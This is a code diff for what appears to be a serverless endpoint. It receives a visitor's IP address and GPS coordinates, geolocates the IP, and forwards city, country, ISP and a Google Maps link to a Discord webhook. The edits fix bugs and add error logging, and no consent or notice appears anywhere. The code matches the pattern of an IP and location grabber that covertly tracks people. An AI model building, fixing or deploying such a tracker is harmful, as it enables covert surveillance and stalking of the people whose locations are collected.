@@ -1,23 +1,24 @@
 export default async function handler(req, res) {
   try {
     const data = req.body || {};
-
     const WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
 
     if (!WEBHOOK_URL) {
       return res.status(500).json({ error: "Missing webhook" });
     }
+
     const ip = data.ip;
 
-    const geoRes = await fetch("https://ipwho.is/${ip}`);
+    const geoRes = await fetch(`https://ipwho.is/${ip}`);
     const geo = await geoRes.json();
-    const msg = `
+
+    let msg = `
 IP: ${ip || "unknown"}
 Location: ${geo.city || "?"}, ${geo.country || "?"}
-ISP: ${geo.isp || "unknown"}
+ISP: ${geo.connection?.isp || "unknown"}
 `;
 
-if (data.lat && data.lon) {
+    if (data.lat && data.lon) {
       msg += `
 GPS: https://maps.google.com/?q=${data.lat},${data.lon}
 Accuracy: ${data.accuracy}m
@@ -34,6 +35,7 @@ Accuracy: ${data.accuracy}m
 
     res.status(200).json({ ok: true });
   } catch (err) {
-    res.status(500).json({ error: "fail" });
+    console.error(err); // 👈 thêm dòng này để debug
+    res.status(500).json({ error: err.message });
   }
 }
